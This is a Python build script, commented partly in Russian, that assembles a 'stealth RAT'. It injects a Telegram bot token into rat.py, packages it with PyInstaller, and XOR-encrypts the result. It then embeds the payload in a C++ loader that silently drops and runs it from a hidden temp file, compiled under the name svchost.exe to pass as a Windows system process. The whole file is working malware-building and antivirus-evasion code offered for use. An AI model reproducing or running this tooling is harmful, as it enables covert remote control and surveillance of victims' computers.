# build.py - БЫСТРАЯ СБОРКА с objcopy
import os
import sys
import subprocess
import random
import zlib
import shutil

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def encrypt_and_build(self, exe_path):
        """Шифрует EXE и создает загрузчик"""
        print("[+] Encrypting EXE...")
        
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # Сжимаем
        compressed = zlib.compress(exe_data, level=9)
        
        # XOR шифруем
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
        
        # Сохраняем зашифрованные данные
        with open('encrypted.bin', 'wb') as f:
            f.write(encrypted)
        
        # Сохраняем ключ
        with open('key.bin', 'wb') as f:
            f.write(self.xor_key)
        
        size_mb = len(encrypted) / (1024*1024)
        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
        
        # Конвертируем бинарные файлы в объектные через objcopy
        print("[+] Converting to object files with objcopy...")
        
        # encrypted.bin → encrypted.o
        cmd = [
            'objcopy',
            '-I', 'binary',
            '-O', 'coff-i386',  # 32-bit COFF
            '--rename-section', '.data=.rdata,readonly,contents,alloc,load,data',
            'encrypted.bin',
            'encrypted.o'
        ]
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] objcopy error (encrypted): {result.stderr.decode()}")
            # Пробуем без опций
            cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'encrypted.bin', 'encrypted.o']
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode != 0:
                print(f"[-] objcopy error: {result.stderr.decode()}")
                return None
        
        # key.bin → key.o
        cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'key.bin', 'key.o']
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] objcopy error (key): {result.stderr.decode()}")
            return None
        
        print("[+] Object files created!")
        
        # Создаем загрузчик
        print("[+] Creating loader...")
        
        loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

extern unsigned char _binary_encrypted_bin_start[];
extern unsigned char _binary_encrypted_bin_end[];
extern unsigned char _binary_key_bin_start[];
extern unsigned char _binary_key_bin_end[];

static void xor_decrypt(unsigned char* data, size_t len, 
                        unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static void RunEXE(unsigned char* exe_data, size_t exe_size) {
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, exe_data, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(5000);
    DeleteFileA(exe_path);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
    
    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
    
    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
    
    RunEXE(decrypted, dll_len);
    
    free(decrypted);
    
    while (1) Sleep(10000);
    
    return 0;
}
'''
        with open('loader_final.cpp', 'w') as f:
            f.write(loader_code)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        print("[+] Compiling final EXE...")
        
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            'encrypted.o',  # ← Объектный файл!
            'key.o',        # ← Объектный файл!
            '-static',
            '-s',
            '-O1',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] Error: {result.stderr.decode()}")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        loader = self.encrypt_and_build(exe)
        if not loader:
            return False
        
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
